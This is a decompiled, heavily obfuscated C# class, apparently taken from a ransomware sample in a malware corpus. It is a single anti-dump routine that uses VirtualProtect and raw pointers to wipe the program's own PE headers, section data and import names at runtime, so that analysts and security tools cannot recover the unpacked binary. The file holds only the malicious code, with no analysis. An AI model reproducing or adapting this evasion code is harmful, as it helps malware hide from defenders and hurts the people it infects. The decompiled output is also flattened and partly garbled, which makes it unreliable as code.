// Decompiled with JetBrains decompiler
// Type: 㨥䀩훩鑁鸉ᬉ꺶
// Assembly: mtrl, Version=5.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 79CC5886-3FF3-4BA2-A3E6-9E50089A921D
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.Win32.Generic-5a26181f2f36991d9055db38b70c0df2d166b99d1714fb7a14978e2e0420b71d.exe

using System;
using System.Runtime.InteropServices;

internal static class 㨥䀩훩鑁鸉\uE6EFᬉ꺶
{
  [DllImport("kernel32.dll", EntryPoint = "VirtualProtect")]
  private static extern unsafe bool 붗鴅\u2A92鎚첾\uD7A4\u05ED㶱(
    byte* lpAddress,
    int dwSize,
    uint flNewProtect,
    out uint lpflOldProtect);

  public static unsafe void 禒㙎鶒긹굎墱ឿ龕()
  {
    byte* hinstance = (byte*) (void*) Marshal.GetHINSTANCE(typeof (㨥䀩훩鑁鸉\uE6EFᬉ꺶).Module);
    byte* numPtr1 = hinstance + 60;
    byte* numPtr2 = hinstance + (int) *(uint*) numPtr1 + 6;
    int num1 = ~---92;
    while (true)
    {
      byte* lpAddress1;
      byte* lpAddress2;
      uint[] numArray1;
      int index1;
      uint[] numArray2;
      uint[] numArray3;
      int index2;
      uint num2;
      uint lpflOldProtect;
      ushort length;
      int index3;
      byte* numPtr3;
      byte* numPtr4;
      byte* lpAddress3;
      byte* numPtr5;
      int index4;
      int num3;
      int num4;
      do
      {
        uint num5;
        int index5;
        int index6;
        uint num6;
        int num7;
        int num8;
        do
        {
          int num9;
          ushort num10;
          uint num11;
          uint num12;
          int index7;
          byte* numPtr6;
          int index8;
          int index9;
          int index10;
          byte* numPtr7;
          int num13;
          int num14;
          do
          {
            byte* lpAddress4;
            int num15;
            int num16;
            do
            {
              int num17;
              do
              {
                switch (num1)
                {
                  case 1:
                  case 40:
                    goto label_64;
                  case 2:
                    *(int*) (lpAddress4 + 12) = 0;
                    num1 = -(4 + 2 - (92 - (2 - (3 - 2))));
                    continue;
                  case 3:
                    if (num5 < numArray1[index1] + numArray2[index1])
                    {
                      num5 = num5 - numArray1[index1] + numArray3[index1];
                      num1 = ~(-4 + (5 - 8) - 56) + 3;
                      continue;
                    }
                    goto label_156;
                  case 4:
                    if (typeof (㨥䀩훩鑁鸉\uE6EFᬉ꺶).Module.FullyQualifiedName != "<Unknown>")
                    {
                      lpAddress4 = hinstance + (int) *(uint*) (numPtr2 - 16);
                      num17 = (int) *(uint*) (numPtr2 - 120);
                      num1 = ~~--72;
                      continue;
                    }
                    goto label_15;
                  case 5:
                  case 30:
                    goto label_52;
                  case 6:
                    goto label_13;
                  case 7:
                    goto label_16;
                  case 8:
                    goto label_18;
                  case 9:
                    goto label_21;
                  case 10:
                    goto label_24;
                  case 11:
                    goto label_25;
                  case 12:
                    goto label_26;
                  case 13:
                    goto label_27;
                  case 14:
                  case 15:
                    goto label_28;
                  case 16:
                    goto label_32;
                  case 17:
                  case 74:
                    goto label_110;
                  case 18:
                    goto label_34;
                  case 19:
                    goto label_37;
                  case 20:
                    goto label_38;
                  case 21:
                    goto label_39;
                  case 22:
                    goto label_40;
                  case 23:
                    goto label_41;
                  case 24:
                    goto label_44;
                  case 25:
                    goto label_45;
                  case 26:
                    goto label_46;
                  case 27:
                    goto label_47;
                  case 28:
                    goto label_50;
                  case 29:
                    goto label_51;
                  case 31:
                    goto label_54;
                  case 32:
                    goto label_111;
                  case 33:
                    goto label_56;
                  case 34:
                    goto label_58;
                  case 35:
                    goto label_59;
                  case 36:
                    goto label_61;
                  case 37:
                    goto label_62;
                  case 38:
                    goto label_63;
                  case 39:
                    goto label_149;
                  case 41:
                    goto label_65;
                  case 42:
                    goto label_67;
                  case 43:
                    goto label_68;
                  case 44:
                    goto label_72;
                  case 45:
                    goto label_73;
                  case 46:
                    goto label_74;
                  case 47:
                    goto label_75;
                  case 48:
                  case 96:
                    goto label_79;
                  case 49:
                    goto label_80;
                  case 50:
                    goto label_81;
                  case 51:
                    goto label_82;
                  case 52:
                    goto label_83;
                  case 53:
                    goto label_84;
                  case 54:
                    goto label_85;
                  case 55:
                    goto label_87;
                  case 56:
                    goto label_88;
                  case 57:
                    goto label_90;
                  case 58:
                    goto label_91;
                  case 59:
                    goto label_93;
                  case 60:
                    goto label_95;
                  case 61:
                    goto label_96;
                  case 62:
                    goto label_97;
                  case 63:
                    goto label_98;
                  case 64:
                    goto label_99;
                  case 65:
                    goto label_101;
                  case 66:
                    goto label_102;
                  case 67:
                    goto label_103;
                  case 68:
                    goto label_19;
                  case 69:
                    *lpAddress2 = (byte) 0;
                    ++lpAddress2;
                    if (*lpAddress2 != (byte) 0)
                    {
                      *lpAddress2 = (byte) 0;
                      ++lpAddress2;
                      int num18 = (int) *lpAddress2;
                      num1 = --50 - 8;
                      if (num18 == 0)
                      {
                        num1 = 3 - -(2 + 6 + (6 - 8) - -19);
                        continue;
                      }
                      continue;
                    }
                    goto label_105;
                  case 70:
                    goto label_106;
                  case 71:
                    goto label_107;
                  case 72:
                    goto label_108;
                  case 73:
                    goto label_109;
                  case 75:
                    goto label_113;
                  case 76:
                    goto label_115;
                  case 77:
                    goto label_116;
                  case 78:
                    goto label_117;
                  case 79:
                    goto label_118;
                  case 80:
                    goto label_120;
                  case 81:
                    goto label_121;
                  case 82:
                    goto label_122;
                  case 83:
                    goto label_123;
                  case 84:
                    goto label_126;
                  case 85:
                    goto label_127;
                  case 86:
                    goto label_128;
                  case 87:
                    goto label_130;
                  case 88:
                    goto label_131;
                  case 89:
                    goto label_132;
                  case 90:
                    goto label_133;
                  case 91:
                    goto label_134;
                  case 92:
                    goto label_135;
                  case 93:
                    goto label_136;
                  case 94:
                    goto label_138;
                  case 95:
                  case 119:
                    goto label_167;
                  case 97:
                    goto label_143;
                  case 98:
                    goto label_144;
                  case 99:
                    goto label_145;
                  case 100:
                    goto label_146;
                  case 101:
                    goto label_147;
                  case 102:
                    goto label_148;
                  case 103:
                    goto label_151;
                  case 104:
                    goto label_152;
                  case 105:
                    goto label_153;
                  case 106:
                    goto label_14;
                  case 107:
                    goto label_155;
                  case 108:
                    goto label_156;
                  case 109:
                    goto label_157;
                  case 110:
                    goto label_158;
                  case 111:
                    goto label_159;
                  case 112:
                    goto label_160;
                  case 113:
                    goto label_161;
                  case 114:
                    goto label_162;
                  case 115:
                    goto label_163;
                  case 116:
                    goto label_164;
                  case 117:
                    goto label_165;
                  case 118:
                    goto label_166;
                  case 120:
                    goto label_170;
                  case 121:
                    goto label_171;
                  case 122:
                    goto label_172;
                  default:
                    lpAddress1 += (int) *(uint*) lpAddress1;
                    num1 = 8 - ---42;
                    continue;
                }
              }
              while (num17 == 0);
              num1 = -(5 + 8 - --126);
              continue;
label_52:
              if (index1 < (int) length)
              {
                num15 = (int) numArray1[index1];
                num16 = (int) num5;
                num1 = --108 + -6 + 6;
              }
              else
                goto label_53;
            }
            while ((uint) num15 >= (uint) num16);
            num1 = 9 - -(--5 - 11);
            continue;
label_13:
            if (num9 >= (int) num10)
              return;
            goto label_158;
label_15:
            num11 = *(uint*) (numPtr2 - 16);
            num12 = *(uint*) (numPtr2 - 120);
            num1 = ~(-104 - --8 - -2);
            continue;
label_16:
            if (index2 >= 11)
            {
              num1 = ~(-71 - (6 - 4));
              continue;
            }
            goto label_169;
label_18:
            (hinstance + (int) num2)[index7] = numPtr6[index7];
            ++index7;
label_19:
            if (index7 >= 11)
            {
              㨥䀩훩鑁鸉\uE6EFᬉ꺶.붗鴅\u2A92鎚첾\uD7A4\u05ED㶱(hinstance + (int) num5, 11, 64U, out lpflOldProtect);
              index5 = 0;
              num1 = ~-50 - 5;
              continue;
            }
            goto label_18;
label_21:
            ++index8;
label_22:
            if (index8 >= (int) length)
            {
              num1 = 9 - (-77 + (8 - 4));
              continue;
            }
            if (numArray1[index8] < num12)
            {
              num13 = (int) num12;
              num14 = (int) numArray1[index8] + (int) numArray2[index8];
              num1 = 8 - -(3 - ~~2);
              continue;
            }
            goto label_21;
label_24:
            *(int*) lpAddress1 = 0;
            lpAddress1 += 4;
            num1 = -~(-8 + -4 - -71);
            continue;
label_25:
            index9 = 0;
            num1 = -(2 - (14 - ~(7 - 5)));
            continue;
label_26:
            numArray3 = new uint[(int) length];
            num1 = ~~~-59;
            continue;
label_27:
            㨥䀩훩鑁鸉\uE6EFᬉ꺶.붗鴅\u2A92鎚첾\uD7A4\u05ED㶱(lpAddress4, 72, 64U, out lpflOldProtect);
            lpAddress2 = hinstance + (int) *(uint*) (lpAddress4 + 8);
            *(int*) lpAddress4 = 0;
            num1 = --22 - (2 - 6);
            continue;
label_28:
            if (index9 >= (int) length)
            {
              num1 = ~3 - (-55 - ~~2) - 7;
              continue;
            }
            int num19 = (int) numArray1[index9];
            int num20 = (int) num2;
            num1 = ~(~64 - (8 + 9));
            if ((uint) num19 < (uint) num20)
            {
              num1 = -~~-59;
              continue;
            }
            continue;
label_32:
            int num21 = 0;
            num1 = 37 - 7 - -9 - 7;
            continue;
label_34:
            if (index3 >= (int) length)
            {
              int num22 = (int) num12;
              num1 = ~-21 - -7;
              if (num22 != 0)
              {
                num1 = 46 + ~-2;
                continue;
              }
              continue;
            }
            goto label_92;
label_37:
            ++index6;
            num1 = -(-42 - (-5 + 6)) - 2;
            continue;
label_38:
            *(int*) numPtr3 = 1866691662;
            num1 = ~~~-22;
            continue;
label_39:
            *(int*) (numPtr3 + 4) = 1852404846;
            *(short*) (numPtr3 + 8) = (short) 25973;
            num1 = 4 - (5 - 4 - 3 - 59 - (2 - 6));
            continue;
label_40:
            㨥䀩훩鑁鸉\uE6EFᬉ꺶.붗鴅\u2A92鎚첾\uD7A4\u05ED㶱(lpAddress1, 4, 64U, out lpflOldProtect);
            *lpAddress1 = (byte) 0;
            num1 = 3 - -~-33;
            continue;
label_41:
            if (*lpAddress1 == (byte) 0)
            {
              ++lpAddress1;
              goto label_110;
            }
            else
            {
              *lpAddress1 = (byte) 0;
              num1 = 42 - --5;
              continue;
            }
label_44:
            lpAddress2 += 4;
            num1 = 2 - -(114 - (~3 - (2 - 4)));
            continue;
label_45:
            㨥䀩훩鑁鸉\uE6EFᬉ꺶.붗鴅\u2A92鎚첾\uD7A4\u05ED㶱(numPtr2, 8, 64U, out lpflOldProtect);
            num1 = -~99 + 2;
            continue;
label_46:
            *(int*) (lpAddress4 + 4) = 0;
            *(int*) (lpAddress4 + 8) = 0;
            num1 = ~~(9 - 7);
            continue;
label_47:
            int index11 = 0;
            goto label_70;
label_50:
            lpAddress2 += 2;
            num1 = -(-~3 - 52 - -8);
            continue;
label_51:
            ushort num23 = *(ushort*) numPtr2;
            numPtr2 = numPtr2 + 4 + (int) num23;
            numPtr6 = stackalloc byte[11];
            *(int*) numPtr6 = 1818522734;
            *(int*) (numPtr6 + 4) = 1818504812;
            *(short*) (numPtr6 + 8) = (short) 108;
            num1 = --45 - 3 + 9;
            continue;
label_53:
            num1 = --132 + ~5 - 9;
            continue;
label_54:
            lpAddress1 += 3;
            num1 = 8 - -~-67;
            continue;
label_56:
            int num24 = index10;
            int num25 = (int) length;
            num1 = 103 + 7 - (5 + 6) - 6;
            if (num24 >= num25)
            {
              num1 = ~(-5 + (6 + 8) - 53 - (8 - 3));
              continue;
            }
            continue;
label_58:
            num1 = 8 - ~~2;
            continue;
label_59:
            ++lpAddress1;
            int num26 = (int) *lpAddress1;
            num1 = -(--3 - 63 + ~5);
            if (num26 == 0)
            {
              num1 = -~--30;
              continue;
            }
            continue;
label_61:
            num6 = *(uint*) numPtr7;
            num1 = -(-41 - 9 - -5);
            continue;
label_62:
            ++lpAddress1;
            num1 = 5 + 4 + (3 - 4) - -68 - -5 + 3;
            continue;
label_63:
            ushort num27 = (ushort) *lpAddress1;
            num1 = -9 - ~67 - 2;
            continue;
label_64:
            ++num9;
            num1 = ~(-~7 - 18) - 3;
            continue;
label_65:
            if (index6 < (int) length)
              goto label_153;
label_66:
            byte* numPtr8 = hinstance + (int) num6;
            num1 = 50 + 2;
            continue;
label_67:
            *lpAddress2 = (byte) 0;
            num1 = 6 - 2 - (-101 - ~(7 - 4)) - 7;
            continue;
label_68:
            num11 = num11 - numArray1[index11] + numArray3[index11];
            goto label_145;
label_69:
            ++index11;
label_70:
            if (index11 < (int) length)
            {
              if (numArray1[index11] < num11)
              {
                num1 = 59 + 5 - -2 - 2;
                continue;
              }
              goto label_69;
            }
            else
            {
              num1 = ~(-99 - (-6 - ~8)) - 2;
              continue;
            }
label_72:
            num1 = -(~9 - ~6 - 58 - -7);
            continue;
label_73:
            index6 = 0;
            num1 = ~(~32 + -9);
            continue;
label_74:
            num5 = *(uint*) numPtr8 + 2U;
            num1 = ~(8 - 102) - 3;
            continue;
label_75:
            index8 = 0;
            goto label_22;
label_88:
            ++lpAddress1;
            if (*lpAddress1 != (byte) 0)
            {
              *lpAddress1 = (byte) 0;
              num1 = ~---98;
              continue;
            }
            goto label_89;
label_91:
            index3 = 0;
            goto label_34;
label_99:
            if (num11 >= numArray1[index11] + numArray2[index11])
              goto label_69;
            else
              goto label_100;
label_110:
            ++num21;
label_111:
            if (num21 < (int) num27)
            {
              㨥䀩훩鑁鸉\uE6EFᬉ꺶.붗鴅\u2A92鎚첾\uD7A4\u05ED㶱(lpAddress1, 8, 64U, out lpflOldProtect);
              num1 = 5 - 3 - (4 - 3) + 9;
              continue;
            }
            goto label_112;
label_155:
            num6 = num6 - numArray1[index6] + numArray3[index6];
            goto label_66;
label_167:
            if (index4 >= 11)
            {
              㨥䀩훩鑁鸉\uE6EFᬉ꺶.붗鴅\u2A92鎚첾\uD7A4\u05ED㶱(lpAddress3, 11, 64U, out lpflOldProtect);
              index2 = 0;
              goto label_16;
            }
            else
              goto label_140;
          }
          while ((uint) num13 >= (uint) num14);
          num1 = ~---72;
          continue;
label_79:
          byte* lpAddress5;
          *(int*) lpAddress5 = 0;
          *(int*) (lpAddress5 + 4) = 0;
          num1 = -(~97 - (5 - 2));
          continue;
label_80:
          *lpAddress2 = (byte) 0;
          ++lpAddress2;
          num1 = -(-71 - (5 + 7));
          continue;
label_81:
          lpAddress1 = (byte*) ((ulong) ((uint) lpAddress1 + 7U) & 18446744073709551612UL);
          num1 = ~(-107 + ~4);
          continue;
label_82:
          numPtr6[10] = (byte) 0;
          numPtr3 = stackalloc byte[11];
          num1 = -(-9 - 8) + 3;
          continue;
label_83:
          num2 = *(uint*) (numPtr7 + 12);
          num1 = 8 - (~5 - ~2);
          continue;
label_84:
          lpAddress3 = hinstance + (int) *(uint*) numPtr4 + 2;
          byte* lpAddress6;
          㨥䀩훩鑁鸉\uE6EFᬉ꺶.붗鴅\u2A92鎚첾\uD7A4\u05ED㶱(lpAddress6, 11, 64U, out lpflOldProtect);
          num1 = ~~112 + 3;
          continue;
label_85:
          int num28 = index5;
          num1 = 122 + -(8 - 4) - 5 - 9;
          if (num28 >= 11)
          {
            num1 = 3 - ~(16 + 7);
            continue;
          }
          continue;
label_87:
          㨥䀩훩鑁鸉\uE6EFᬉ꺶.붗鴅\u2A92鎚첾\uD7A4\u05ED㶱(lpAddress2, 4, 64U, out lpflOldProtect);
          num1 = --~-70;
          continue;
label_89:
          num1 = -(4 - 3 - 110) + 5;
          continue;
label_90:
          lpAddress1 += 2;
          num1 = -~24 - 9;
          continue;
label_92:
          㨥䀩훩鑁鸉\uE6EFᬉ꺶.붗鴅\u2A92鎚첾\uD7A4\u05ED㶱(numPtr2, 8, 64U, out lpflOldProtect);
          Marshal.Copy(new byte[8], 0, (IntPtr) (void*) numPtr2, 8);
          num1 = --123 - 7;
          continue;
label_93:
          int num29 = (int) num2;
          int num30 = (int) numArray1[index9] + (int) numArray2[index9];
          num1 = 2 - (~5 - --73);
          if ((uint) num29 < (uint) num30)
          {
            num1 = ~(5 - 4 - --91);
            continue;
          }
          continue;
label_95:
          *(int*) lpAddress1 = 0;
          lpAddress1 += 4;
          num1 = ~-59 - ~4;
          continue;
label_96:
          numPtr3[10] = (byte) 0;
          num1 = 2 - ~~-2;
          continue;
label_97:
          lpAddress6 = hinstance + (int) *(uint*) (numPtr5 + 12);
          num1 = -(~58 - -6);
          continue;
label_98:
          int num31 = 0;
          num1 = ~---93;
          continue;
label_100:
          num1 = -~--42;
          continue;
label_101:
          num1 = ~(-116 - 2);
          continue;
label_102:
          *lpAddress1 = (byte) 0;
          num1 = 5 - (-42 - (6 + (2 - 2)) - (7 - 4));
          continue;
label_103:
          *(int*) lpAddress2 = 0;
          lpAddress2 += 12;
          num1 = ~-(125 + -(7 - 4));
          continue;
label_105:
          num1 = 4 - ~~-73;
          continue;
label_106:
          numPtr2 += 14;
          num1 = --34 + -5;
          continue;
label_107:
          num12 = num12 - numArray1[index8] + numArray3[index8];
          num1 = --~-99;
          continue;
label_108:
          int num32 = 0;
          num1 = --(33 + (7 + 7 - (6 + 2)));
          continue;
label_109:
          num1 = -(-43 - -3);
          continue;
label_112:
          num1 = ~(~109 + 3);
          continue;
label_113:
          int num33 = num31;
          num1 = ~~28 - 6;
          if (num33 >= 8)
          {
            num1 = --68 - -6;
            continue;
          }
          continue;
label_115:
          ++index3;
          num1 = 6 - ~(~(2 - 8) - -6);
          continue;
label_116:
          lpAddress2 += 3;
          num1 = ~(-~6 - 9 - (7 - 7));
          continue;
label_117:
          index7 = 0;
          num1 = 71 - ~~3;
          continue;
label_118:
          uint num34;
          if (num34 < numArray1[index10] + numArray2[index10])
          {
            num34 = num34 - numArray1[index10] + numArray3[index10];
            num1 = ~-91 + (9 + 4) - 7;
            continue;
          }
          goto label_142;
label_120:
          lpAddress1 += 12;
          num1 = -15 - -(8 + 7);
          continue;
label_121:
          ++index9;
          num1 = --(29 - (5 - ~9));
          continue;
label_122:
          numPtr7 = hinstance + (int) num12;
          num1 = 3 - ~39 - 7;
          continue;
label_123:
          int num35;
          ++num35;
label_124:
          int num36 = num35;
          num1 = --~-56;
          if (num36 >= 8)
          {
            num1 = ~~(24 - ~(6 + 9));
            continue;
          }
          continue;
label_126:
          ++num31;
          num1 = ~---76;
          continue;
label_127:
          㨥䀩훩鑁鸉\uE6EFᬉ꺶.붗鴅\u2A92鎚첾\uD7A4\u05ED㶱(lpAddress2, 4, 64U, out lpflOldProtect);
          num1 = 2 - (-(2 - 7) - 63 - 7);
          continue;
label_128:
          int num37 = (int) num6;
          int num38 = (int) numArray1[index6] + (int) numArray2[index6];
          num1 = ~(-22 - (~2 + -3) - (2 + 2));
          if ((uint) num37 < (uint) num38)
          {
            num1 = ~-117 - 9;
            continue;
          }
          continue;
label_130:
          ++index4;
          num1 = -(-114 - 8) - 3;
          continue;
label_131:
          index10 = 0;
          num1 = -6 - -39;
          continue;
label_132:
          num2 = num2 - numArray1[index9] + numArray3[index9];
          num1 = 3 - -~-44;
          continue;
label_133:
          index1 = 0;
          num1 = -(9 + -(8 - 3)) + 9;
          continue;
label_134:
          length = *(ushort*) numPtr2;
          num1 = ~(-64 + ~6);
          continue;
label_135:
          num1 = 6 - -69;
          continue;
label_136:
          if (numArray1[index10] < num34)
          {
            num1 = ~-89 - 9;
            continue;
          }
          goto label_142;
label_138:
          ++lpAddress2;
          if (*lpAddress2 == (byte) 0)
          {
            ++lpAddress2;
            num1 = ~~(66 + (8 + 5 - 6));
            continue;
          }
          goto label_80;
label_140:
          lpAddress6[index4] = numPtr6[index4];
          num1 = --90 - ~2 - 6;
          continue;
label_142:
          ++index10;
          num1 = ~~42 - 9;
          continue;
label_143:
          ++lpAddress1;
          num1 = 15 + 8;
          continue;
label_144:
          num1 = 5 - -(69 - (4 - 7 - (3 + 2)));
          continue;
label_145:
          lpAddress5 = hinstance + (int) num11;
          㨥䀩훩鑁鸉\uE6EFᬉ꺶.붗鴅\u2A92鎚첾\uD7A4\u05ED㶱(lpAddress5, 72, 64U, out lpflOldProtect);
          num34 = *(uint*) (lpAddress5 + 8);
          num1 = 73 - (3 - 3 - (6 + 9));
          continue;
label_146:
          num10 = (ushort) *lpAddress2;
          lpAddress2 += 2;
          num9 = 0;
          num1 = --60 - (9 + 9) - 8;
          continue;
label_147:
          *(int*) (lpAddress5 + 8) = 0;
          *(int*) (lpAddress5 + 12) = 0;
          lpAddress1 = hinstance + (int) num34;
          num1 = ~3 - -126;
          continue;
label_148:
          Marshal.Copy(new byte[8], 0, (IntPtr) (void*) numPtr2, 8);
          numPtr2 += 40;
          ++num32;
label_149:
          num7 = num32;
          num8 = (int) length;
          num1 = ~(-32 - 3) - 9;
          continue;
label_160:
          num35 = 0;
          goto label_124;
        }
        while (num7 < num8);
        num1 = ~(~~6 - 29) - 9;
        continue;
label_151:
        numPtr2 += 40;
        num1 = -(-71 - (8 - 3));
        continue;
label_152:
        (hinstance + (int) num5)[index5] = numPtr3[index5];
        ++index5;
        num1 = 67 - 8 - (6 - 5) - 4;
        continue;
label_153:
        num3 = (int) numArray1[index6];
        num4 = (int) num6;
        num1 = 34 - ~-4 - (7 + 5);
      }
      while ((uint) num3 >= (uint) num4);
      num1 = 104 - (4 + 5 + 9);
      continue;
label_156:
      ++index1;
      num1 = 3 + 8 - ~18;
      continue;
label_157:
      numArray1 = new uint[(int) length];
      numArray2 = new uint[(int) length];
      num1 = -9 - -29 - 8;
      continue;
label_158:
      㨥䀩훩鑁鸉\uE6EFᬉ꺶.붗鴅\u2A92鎚첾\uD7A4\u05ED㶱(lpAddress2, 8, 64U, out lpflOldProtect);
      *(int*) lpAddress2 = 0;
      num1 = ~2 - ~28 - 2;
      continue;
label_159:
      lpAddress1 += 2;
      num1 = 2 - -~-37;
      continue;
label_161:
      numPtr5 = hinstance + (int) *(uint*) (numPtr2 - 120);
      numPtr4 = hinstance + (int) *(uint*) numPtr5;
      num1 = 4 - (-44 - 2 - (8 + 4));
      continue;
label_162:
      lpAddress1 += 2;
      num1 = ~(-26 - (2 - 5 - (4 + 3)) - 2);
      continue;
label_163:
      index4 = 0;
      num1 = -7 - (-98 - ~~9) - 5;
      continue;
label_164:
      numArray1[index3] = *(uint*) (numPtr2 + 12);
      numArray2[index3] = *(uint*) (numPtr2 + 8);
      numArray3[index3] = *(uint*) (numPtr2 + 20);
      num1 = ~~~-104;
      continue;
label_165:
      㨥䀩훩鑁鸉\uE6EFᬉ꺶.붗鴅\u2A92鎚첾\uD7A4\u05ED㶱(hinstance + (int) num2, 11, 64U, out lpflOldProtect);
      num1 = ~~71 + 7;
      continue;
label_166:
      *(int*) lpAddress2 = 0;
      num1 = -(6 - 4) - -122;
      continue;
label_169:
      lpAddress3[index2] = numPtr3[index2];
      ++index2;
      num1 = 3 - (3 - 6 - (7 - 2) - 5 - ~8);
      continue;
label_170:
      lpAddress2 += 4;
      num1 = ~7 - (-130 - (~9 + (2 + 6))) - 8;
      continue;
label_171:
      lpAddress2 = (byte*) ((ulong) ((uint) (lpAddress2 + (int) *(uint*) lpAddress2) + 7U) & 18446744073709551612UL) + 2;
      num1 = -(8 - 102 - 6);
      continue;
label_172:
      㨥䀩훩鑁鸉\uE6EFᬉ꺶.붗鴅\u2A92鎚첾\uD7A4\u05ED㶱(lpAddress1, 4, 64U, out lpflOldProtect);
      *(int*) lpAddress1 = 0;
      num1 = ~(-84 + 3);
    }
label_14:;
  }
}
